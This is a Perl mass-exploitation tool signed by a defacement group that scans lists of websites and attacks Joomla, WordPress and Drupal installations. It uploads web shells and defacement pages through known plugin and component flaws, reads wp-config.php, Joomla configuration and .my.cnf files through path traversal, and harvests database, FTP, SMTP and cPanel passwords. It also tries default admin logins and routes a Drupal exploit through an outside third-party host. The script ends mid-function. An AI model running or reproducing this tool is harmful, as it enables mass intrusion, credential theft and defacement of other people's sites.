#!/usr/bin/perl 
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
my $datetime    = localtime;
$reverse="reverse";
    if (-e $reverse) 
    {
    }
    else
    {
        mkdir $reverse or die "Error creating directory: $reverse";
    }

$rez="resault";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }
$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);
system('cls');


print q{

 ___       ___       ___       ___             _____                        
(  _`\    |  _`\    (  _`\    (  _`\          (_   _)                       
| | ) |   | (_) )   | (_(_)   | | ) | ____      | |   __     _ _   ___ ___  
| | | )   | ,  /    `\__ \    | | | )(_  ,)     | | /'__`\ /'_` )/' _ ` _ `\
| |_) | _ | |\ \  _ ( )_) |   | |_) | /'/_      | |(  ___/( (_| || ( ) ( ) |
(____/'(_)(_) (_)(_)`\____)   (____/'(____)     (_)`\____)`\__,_)(_) (_) (_)

+======[iprange scripte coded BY D.R.S Dz Team]======+
|                    Reverse To All Sites                     |
|Joomla wordpress Drupal Magento PrestaShop OpenCart vBulletin|
+=============================================================+
        
};

print "D.R.S Dz Team : ";
my $targett = <STDIN>;
chomp $targett;

if($targett eq 'imou')
{
print "Enter List IP:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "[-] Can't open the List of site file ?!";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();
}else{
gett();
}

}
}

print q{

+=======[Upload shell]=======+
|     BY D.R.S Dz Team       |
+============================+
};
open(tarrget,"<sites.txt") || die "[-] Can't open the List of site file !";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
efrez();
}
sub efrez($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);

my $efreez = $ua->get("$site")->content;
my $efreezz = $ua->get("$site/admin")->content;
if($efreez =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print "Yes:---> WORDPRESS: ".$site."\n\n";
open(save, '>>reverse/wordpress.txt');
    print save "$site\n";
    close(save);
dlskin();
wysija();
gravity();
revshell();
}

elsif($efreez =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
    print "Yes:---> Joomla: ".$site."\n\n";
open(save, '>>reverse/joomla.txt');
    print save "$site\n";   
    close(save);
comadsmanegr();
comusers();
comjce();
comediashell();
comediaindex();
comblog();
comjdowloads();
hdflvplayer();
comfabr();
indecomfabr();
    }

elsif($efreez =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print "Yes:---> Drupal: ".$site."\n\n";
    fuckdrupal();

open(save, '>>reverse/Drupal.txt'); 
    print save "$site\n";   
    close(save);
    }
elsif($efreezz =~/common\/forgotten/) {
    print "Yes:---> OPENCART: ".$site."\n\n";
open(save, '>>reverse/opencart.txt');
    print save "$site\n";   
    close(save);
    }
elsif($efreezz =~/index\/forgotpassword/) {
    print "Yes:---> MAGENTO: ".$site."\n\n";
open(save, '>>reverse/magento.txt');
    print save "$site\n";   
    close(save);
    }else{
	
    print "no:--->  $site\n";
	adminchk();
}
}


####################################################################################################################
####################################################################################################################
######################################### DRUPAL  ##################################################################
####################################################################################################################
sub fuckdrupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
$drupalink = "http://www.cleanuptheworld.org/images/au/mast/gg.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print "DRUPAL EXPLOIT:";
print "---------------------->: ";
print "VULN";
print "\n";

print "WAIT I WILL MAKE SURE ABOUT USER AND PASSWORD\n";
# // here to test the user name and the password if the website has been really fucked or not :p
$admin ="gassrini";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';
print "$wp\n";

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print "BOOM $site => User | $admin Password | $pass","\n";
    open(save, '>>resault/Drupal.txt');
    print save "Success drs ! $site | username : gassrini | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print "NOT DRUPAL ---------------------->: ERROR\n";
    }
}else{
# // here to test user: admin and password : admin on the panel admin 
print "TRYING WITH USER AND PASSWORD ADMIN\n"; 
$admin="admin";
$pass ="admin";
$dr = $site . '/user/login';
$brute = POST $dr, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in'];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){

print "BOOM $site=> User | $admin Password | $pass","\n";

    open(save, '>>resault/Drupal.txt');
    
    print save "Success drs ! $site | username : $admin | pass: $pass\n";
    
    close(save);
    }else{
print "DRUPAL ---------------------->: ";
print "ERROR";
print "\n";

        }
    
}
}



####################################################################################################
####################################################################################################
######################################  JCE      ###################################################
####################################################################################################
####################################################################################################
   sub comjce($site){
print "COM JCE:";
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
if ($res =~ m/No function call specified!/i){
    open(save, '>>resault/vulntargets.txt');   
    print save "JCE $site\n";   
    close(save);

     print "---------------------->: ";
print "VULN JCE";
print "\nUPLOADING PICTURE ";
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => "px.gif",
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
print "---------------------->: ";
print "PATCHED";
print "\n";
}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/px.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
print "---------------------->: ";
print "DEFACED";
print "\n";
print "LINK => $def\n";
zoneh();
mirrorzon();
}
}else{
print  "---------------------->: ";
print "NOT VULN";
print "\n";
}

    }
####################################################################################################
####################################################################################################
#################################  COM MEDIA  ######################################################
####################################################################################################
####################################################################################################
sub comediashell($site){
print "\n";
print "COM MEDIA:";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
$shlez = "top.PhP.txt";
$shlz="$site/images/top.PhP.txt";
$index="$site/xxs.php";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
 print "---------------------->: VULN \n UPLOADING SHELL";
     open(save, '>>resault/vulntargets.txt');   
    print save "Media $site\n";   
    close(save);
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/drs/ || $check->is_success ) {
 print"---------------------->: ";
print "SUCCESS";
print "\n";
        print "SHELL LINK =>  $shlz","\n";
                open (TEXT, '>>resault/shells.txt');
                print TEXT "\n COM MEDIA SHELL =>$shlz \n";
                close (TEXT);
my $checkndex = $ua->get("$index")->content;
if($checkndex=~/Hacked/){
        $def="$index";

        print "INDEX LINK => $def","\n";
    zoneh();
    mirrorzon()
}

        }
    }else{
	print  "---------------------->: ";
print "NOT VULN";
print "\n";
}
        }           
########################################## INDEX ###################################################
sub comediaindex(){
$shlez = "top.txt";
$shlz="$site/images/top.txt";
#$index="$site/done.html";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
 print "\n UPLOADING INDEX";
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$shlez] ]);
 $check = $ua->get($shlz);
if($check->content =~/Hacked/ || $check->is_success ) {
 print "---------------------->: ";
print "DEFACED";
print "\n";

        print "INDEX LINK =>  $shlz","\n";
        $def="$shlz";
    zoneh();
mirrorzon()
        }

        }
    }
####################################################################################################
####################################################################################################
#########################################jdownloads  ###############################################
####################################################################################################
####################################################################################################

    sub comjdowloads($site){
print "COM JDOWNLOADS";
$file="top.zip";
$filez="top.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/top.php.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"ERORDZ", mail=>"samiusmh695@gmail.com", filetitle =>"Fallaga Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print "---------------------->: ";
print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "jdownloads $site\n";   
    close(save);

print "SCANING SHELL ---------------------->: ";
print "WAIT";
print "\n";

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/drs/) {
print "SHELL LINK => $shellpath","\n";
        open (TEXT, '>>resault/shells.txt');
        print TEXT " jdownloads SHELL => $shellpath\n";
        close (TEXT);
}else{
##################################################################
print "ERROR ---------------------->: ";           
print "SHELL 404";
print "\n";

}

# // if shell not uploaded this will upload a gif index //

print "JDOWNLOAD INDEX:";

$def = $site . '/images/jdownloads/screenshots/px.gif';
$filee="top1.zip";
$filezz="px.gif";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"BKSMILE", mail=>"samiusmh695@gmail.com", filetitle =>"Tunisian Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print " ---------------------->: ";            
print "OK";
print "\n";
print "SCANING INDEX ---------------------->:";           
print "WAIT";
print "\n";

my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print "DEFACE ---------------------->:";           
print "SUCCESS";
print "\n";

print "INDEX LINK => $def","\n";
zoneh();
mirrorzon();
}else{
print "DEFACE ---------------------->:";            
print "ERROR";
print "\n";

        }
}
}else{ 
print  "---------------------->: ";            
print "NOT VULN";
print "\n";

}

    }


####################################################################################################
####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
####################################################################################################
   sub hdflvplayer($site){

# // here for download config but i have to add download cpanel information :p  //

        print "HDFLVPLAYER:";
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){
    print "---------------------->: ",                
print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "hdflvplayer $site\n";   
    close(save);




        open (TEXT, '>>resault/databases.txt');
        print TEXT "$site\n DATABASE INFO\n";
        close (TEXT);
        print "\t DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print "\t Database Password = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print "\t Database Host = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " Database Host = $1\n";
        close (TEXT);
  }


print "\t FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print "\t FTP Host = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n FTP INFO\n FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print "\t FTP Port = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print "\t FTP User = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print "\t FTP Pass = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "FTP Pass = $1\n\n";
        close (TEXT);
  }



print "\t SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print "\t SMTP User = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " SMTP INFO\n SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print "\t SMTP Password = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT " SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print "\t SMTP Port = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print "\t SMTP Host = $1 \n\n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print  "---------------------->: ";            
print "NOT VULN";
print "\n";

    }

}

####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################

sub comfabr(){
        print "COM FABRIC:";
$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/top.txt';
$fabshell = $site . '/media/top.PhP.txt';
##
$indfile="top.txt";
$shelfile="top.PhP.txt";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/def/) {
print "---------------------->: ";

print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "fabric $site\n";   
    close(save);

print "SHELL LINK => $fabshell\n";
        open (TEXT, '>>resault/shells.txt');
        print TEXT "COM FABRIC =>$fabshell \n";
        close (TEXT);
}else{
            print "---------------------->: ";            
print "NOT VULN";
print "\n";

    }
}
############################################# INDEX ################################################

sub indecomfabr(){
    print "UPLOAD INDEX COM FABRIC ---------------------->:";
print "WAIT";
print "\n";
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$top")->content;
if($checkfab =~/Hacked/) {
        open(save, '>>resault/vulntargets.txt');   
    print save "fabric $site\n";   
    close(save);

    print "DEFACE ---------------------->: ";
print "SUCCESS";
print "\n";

    print "INDEX LINK => $def\n";
zoneh();
mirrorzon();
            }else{
print  "DEFACE ---------------------->: ";        
print "ERROR";
print "\n";

                        }
}

####################################################################################################
####################################################################################################
#######################################   COM USERS    #############################################
####################################################################################################
####################################################################################################

sub comusers(){
    print "COM USER SCANNER:";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

my $exploit = "$site/index.php?option=com_users&view=registration";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/jform_email2-lbl/) {
    print"---------------------->: ";           
print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "users $site\n";   
    close(save);

    }else{
        print"---------------------->: ";        
print "NOT VULN";
print "\n";
    }
}

####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
    print "COM ADS MANAGER:";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["top1.jpg"], name => "done.html"]);
if ($exploit->decoded_content =~ /done.html/) {
    print "---------------------->: VULN \n";
        open(save, '>>resault/vulntargets.txt');   
    print save "adsmanager $site\n";   
    close(save);

    print "UPLOAD INDEX ---------------------->: ";
print "OK";
print "\n";

    $def="$site/tmp/plupload/done.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Hacked|Defaced|EROR|DZ/) {
    print "DEFACE ---------------------->: ";
print "SUCCESS";
print "\n";
print "INDEX LINK => $def\n";
    zoneh();
    mirrorzon();
    adshell();
    }
}else
{print "---------------------->: ";
print "NOT VULN";
print "\n";
}
}




sub adshell(){

        print "UPLOAD SHELL ---------------------->: ";
my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
my $exploitxx = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["loader.jpg"], name => "xxs.php"]);
if ($exploitxx->decoded_content =~ /xxs.php/) {
print "OK";
print "\n";
print "SCANING SHELL ---------------------->: ";
print "WAIT";
print "\n";

my $check = $ua->get("$site/tmp/plupload/xxs.php")->content;
my $checkk = $ua->get("$site/xxs.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "SHELL ---------------------->:";           
print "SUCCESS";
print "\n";
print "SHELL LINK => $site/xxs.php\n";
    open(save, '>>resault/shells.txt');
    print save "adsmanager $site/xxs.php\n";
    close(save);
    my $checkjo = $ua->get("$site/un.php")->content;
if($checkjo =~ /path:(.*)<b><br>uname:(.*)<br><\/b>drs/){
    print "\n";
print "PATH : $1","\n\n";
print "KERNEL:$2","\n";
print "\n";
    open(save, '>>resault/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
}else{
  print "SHELL ---------------------->:";            
print "ERROR";
print "\n";
}

}
}
####################################################################################################
####################################################################################################
############################# COM BLOG SCANNER    ##################################################
####################################################################################################
####################################################################################################
sub comblog(){
    print "COM BLOG SCANNER:";


$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (10);

my $exploitblog = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~/has been uploaded/) {
    print"---------------------->: ";
print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "blog $site\n";   
    close(save);

print " $site EXPLOIT IT MANUEL \n";
    }
    else {print "---------------------->: ";
print "NOT VULN";
print "\n";

}
}

####################################################################################################
####################################################################################################
sub dlskin(){
print "DL-SKIN_";
@dlk=('/wp-content/themes/infocus/lib/scripts/dl-skin.php', '/wp-content/themes/elegance/lib/scripts/dl-skin.php', '/wp-content/themes/awake/lib/scripts/dl-skin.php', '/wp-content/themes/fusion/lib/scripts/dl-skin.php', '/wp-content/themes/Minamaze_Pro/lib/scripts/dl-skin.php', '/wp-content/themes/construct/lib/scripts/dl-skin.php', '/wp-content/themes/persuasion/lib/scripts/dl-skin.php', '/wp-content/themes/dejavu/lib/scripts/dl-skin.php', '/wp-content/themes/versatile/lib/scripts/dl-skin.php', '/wp-content/themes/Melos_Pro/lib/scripts/dl-skin.php', '/wp-content/themes/barracudafx/lib/scripts/dl-skin.php', '/wp-content/themes/mesocolumn/lib/scripts/dl-skin.php');
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
foreach $dlkk(@dlk){
chomp $dlkk;
$url = $site.$dlkk;
#_mysite_download_skin => '../../../../../wp-config.php
my $exploitdl = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlz = $exploitdl->content;
if($dlz =~ m/DB_NAME/g){
print "---------------------->: ";
print "VULN";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "dl-skin cnfg $site\n";   
    close(save);
my $exploitdl2 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlzz = $exploitdl2->content;
while($dlzz =~ m/DB_NAME/g){


        if ($dlzz =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t Database Name = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n DATABASE  \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($dlzz =~ /DB_USER\', \'(.*)\'\)/){
        print "\t Database User = $1 \n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database User = $1";
        close (TEXT)
        }
        if ($dlzz =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t Database Password = $1 \n";
        $pass= $1 ;
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database Password = $pass";
        close (TEXT)
        }
        if ($dlzz =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t Database Host = $1 \n\n";
        open (TEXT, '>>resault/databases.txt');
        print TEXT "\n Database Host = $1";
        close (TEXT)
        }

wpbrutek();

print "DL-SKIN GET CPANEL";
my $exploitdl23 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../wp-config.php'] );
$dlzzz = $exploitdl23->content;
if($dlzzz =~ m/user=/g){
print "---------------------->: ";
print "FOUNDED";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "dl-skin cpnl $site\n";   
    close(save);
my $exploitdl234 = $ua->post("$url",Content-Length => '1', Content =>  ['_mysite_download_skin', => '../../../../../../.my.cnf'] );
$dlzzzz = $exploitdl234->content;
while($dlzzzz =~ m/user/g){
        if ($dlzzzz =~ /user=(.*)/){

        print "\n\t Cpanel User = $1 \n";
        open (TEXT, '>>resault/cpanels.txt');
        print TEXT "\n cpanel  \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($dlzzzz =~ /password="(.*)"/){
        print "\t Cpanel Pass = $1 \n\n";
        open (TEXT, '>>resault/cpanels.txt');
        print TEXT "\n Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{print "---------------------->: ";
print "NOT FOUNDED";
print "\n";
}
}}
}
}
####################################################################################################

sub wysija(){
print "WYSIJA:";

$zokometheme = "my-theme";
my $path = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $exploit = $ua->post("$site/$path", Content_Type => 'form-data', Content => [ $zokometheme => ['top3.zip', => 'top.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$site/wp-content/uploads/wysija/themes/top/herewgo.php")->content;
my $checkk = $ua->get("$site/xxs.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
        open(save, '>>resault/vulntargets.txt');   
    print save "wysija $site\n";   
    close(save);
print"---------------------->: ";
print "OK";
print "\n";

print "UPLOADING SHELL---------------------->: ";

print "SUCCESS";
print "\n";
print "SHELL LINK => $site/xxs.php\n";
    open(save, '>>resault/shells.txt');  
    print save "WYSIJA $site/xxs.php\n"; 
    close(save);
my $checkgasss = $ua->get("$site/un.php")->content;
if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>fallagateam/){
    print "\n";
print  "PATH : $1","\n\n";
print  "KERNEL:$2","\n";
print "\n";
    open(save, '>>resault/shells.txt');
    
    print save "Path : $1\nKernel:$2\n";
    
    close(save);
}
$def="$site/done.html";
my $fuckingcheck = $ua->get("$def")->content;
    if($fuckingcheck =~m/ERORDZ|Hacked/i) {
                    zoneh();
                    mirrorzon();
}




}else {
    print"---------------------->: ";

print "ERROR";
print "\n";

}
}
####################################################################################################
####################################################################################################
########################################   GRAVITY FORMS   #########################################
####################################################################################################
####################################################################################################

sub gravity(){
print "GRAVITY FORMS:";
my $path = "/?gf_page=upload";
if($site !~ /http:\/\//) { $site = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploitgrav = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["top.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "drs.php5"]);
if ($exploitgrav->decoded_content =~ /_input_3_top.php5/) {
    print "---------------------->: ";
print "Vuln";
print "\n";
    open(save, '>>resault/vulntargets.txt');   
    print save "gravi $site\n";   
    close(save);

    print "SCANING SHELL ---------------------->: ";
    open(save, '>>resault/libs.txt');
        print save "$site/_input_3_top.php5\n";
        close(save);
    my $checkgrav = $ua->get("$site/_input_3_drs.php5")->content;
    my $checkkgrav = $ua->get("$site/xxs.php")->content;
        if($checkkgrav =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
print "UPLODED";
print "\n";
print "SHELL LINK => $site/xxsphp \n";
        open(save, '>>resault/shells.txt');  
        print save "GRAVITY  $site/xxs.php\n";   
        close(save);

# get uname and path on server 
my $checkgasss = $ua->get("$site/un.php")->content;
            if($checkgasss =~ /path:(.*)<b><br>uname:(.*)<br><\/b>fallagateam/){
    print "\n";
print "PATH : $1","\n\n";
print "KERNEL :$2","\n";
print "\n";
            open(save, '>>resault/shells.txt'); 
            print save "Path : $1\nKernel:$2\n";    
            close(save);
            $def="$site/done.html";
            zoneh();
            mirrorzon();
}
#### get info Done ..//// 



    }else{
            
print "ERROR!!";
print "\n";
upindex();



}





}else{  print "---------------------->: ";
print "NOT VULN";
print "\n";
}
}

sub upindex{
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
